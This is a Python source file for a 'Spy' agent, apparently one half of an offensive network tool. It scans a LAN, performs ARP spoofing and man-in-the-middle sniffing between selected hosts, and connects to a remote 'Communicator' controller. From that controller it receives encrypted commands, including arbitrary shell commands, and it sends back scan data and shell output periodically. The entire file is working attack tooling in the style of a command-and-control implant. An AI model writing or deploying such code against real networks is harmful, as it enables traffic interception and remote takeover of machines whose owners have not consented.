from spyPackage.NetworkManager import *
from spyPackage.Shell import *
from spyPackage.Translator import *
from spyPackage.Encrypter import *
import os
import time

class Spy:
    def __init__(self, interface, spyIP, spyMAC):
        self.translator = Translator()
        self.networkManager = NetworkManager(interface, spyIP, spyMAC, spyIP, self.translator)
        self.shell = Shell()
        self.setup()
        self.encrypter = Encrypter()#change to encryption
        self.spyName = None

    def main(self):
        while True:
            self.connect()
            print("The Spy Has Successfully Connected To The Communicator\n"
                  "Communication Is Encrypted.")
            while True:
                command = self.networkManager.socketNetwork.recv()
                print("Command Received.")
                if self.networkManager.socketNetwork.connectionError:
                    break
                self.executeCommand(command)
            self.disconnect()


    def setup(self):
        if self.networkManager.socketNetwork.connectionError:
            self.shutDown()
        self.networkManager.arpSpoofer.spoof()
        self.networkManager.mitm.sniff()
        self.networkManager.scanner.scan()

    def connect(self):
        time.sleep(self.networkManager.socketNetwork.reportInterval)#wait for network thread to stop
        self.spyName = input("Enter Spy Name.\t")
        while True:
            if self.networkManager.socketNetwork.comIP != None:
                self.disconnect()#not sure if this is good
            ip = input("Enter The IP Address Of The Communicator.\t")
            if ip == "stop":
                self.shutDown()
            self.networkManager.socketNetwork.connectionError = False
            self.networkManager.socketNetwork.setup()
            self.networkManager.socketNetwork.connect(ip)
            if self.networkManager.socketNetwork.connectionError == False:
                idPacket = self.translator.packData(self.translator.showIdentity(self.spyName))
                self.networkManager.socketNetwork.send(idPacket)
            while self.networkManager.socketNetwork.connectionError == False:
                randNumber = self.translator.unpackData(self.networkManager.socketNetwork.recv())
                if self.networkManager.socketNetwork.connectionError:
                    break
                password = input("Enter The Password Of The Communicator.\t")
                if password == "stop":
                    break

                key = self.encrypter.genKey(password, self.spyName)
                self.encrypter.setKey(key)
                encryptedNumber = self.encrypter.encrypt(randNumber)
                self.networkManager.socketNetwork.send(self.translator.packData(encryptedNumber))
                if self.networkManager.socketNetwork.connectionError:
                    break
                result = self.translator.unpackData(self.networkManager.socketNetwork.recv())
                if self.networkManager.socketNetwork.connectionError == False and result == self.translator.LOGGED_IN:
                    netThread = threading.Thread(target=self.networkThread)
                    netThread.start()
                    return
                print("Wrong Password.")

    def disconnect(self):
        self.networkManager.socketNetwork.disconnect()

    def networkThread(self):
        while True:
            if self.networkManager.socketNetwork.connectionError:
                return
            update = self.getUpdate()
            self.networkManager.socketNetwork.send(self.translator.packData(self.encrypter.encrypt(update)))
            time.sleep(self.networkManager.socketNetwork.reportInterval)


    def executeCommand(self, command):
        command = self.translator.unpackData(command)
        command = self.encrypter.decrypt(command)
        if command == None:
            return
        try:
            scan, addSpoofs, delSpoofs, addMitm, delMitm, command = self.translator.translateFrom(command)
            if scan:
                self.networkManager.scanner.scan()
            for spoof in addSpoofs:
                sta1 = self.networkManager.scanner.getStationByIP(spoof[0])
                sta2 = self.networkManager.scanner.getStationByIP(spoof[1])
                if sta1 != None and sta2 != None:
                    self.networkManager.arpSpoofer.addStaLink(StationLink(sta1, sta2))#sta1 + sta2
            for spoof in delSpoofs:
                sta1 = self.networkManager.scanner.getStationByIP(spoof[0])
                sta2 = self.networkManager.scanner.getStationByIP(spoof[1])
                if sta1 != None and sta2 != None:
                    self.networkManager.arpSpoofer.delStaLink(StationLink(sta1, sta2))
            for mitm in addMitm:
                sta1 = self.networkManager.scanner.getStationByIP(mitm[0])
                sta2 = self.networkManager.scanner.getStationByIP(mitm[1])
                if sta1 != None and sta2 != None:
                    link = StationLink(sta1, sta2)
                    self.networkManager.arpSpoofer.addStaLink(link)
                    self.networkManager.mitm.addStaLink(link)
            for mitm in delMitm:
                sta1 = self.networkManager.scanner.getStationByIP(mitm[0])
                sta2 = self.networkManager.scanner.getStationByIP(mitm[1])
                if sta1 != None and sta2 != None:
                    self.networkManager.mitm.delStaLink(StationLink(sta1, sta2))
            if command != "":
                self.shell.enterCommand(command)
        except Exception as e:
            print(e)

    def getUpdate(self):
        scannedStations = self.networkManager.scanner.stations
        spoofLinks = self.networkManager.arpSpoofer.stationLinks
        mitmLinks = self.networkManager.mitm.stationLinks
        shellOutput = self.shell.getShellOutput()
        return self.translator.translateTo(scannedStations, spoofLinks, mitmLinks, shellOutput)

    def shutDown(self):
        print("Closing Spy...")
        self.networkManager.mitm.disableIPForwarding()
        self.networkManager.arpSpoofer.updateStaLinks([])
        os._exit(1)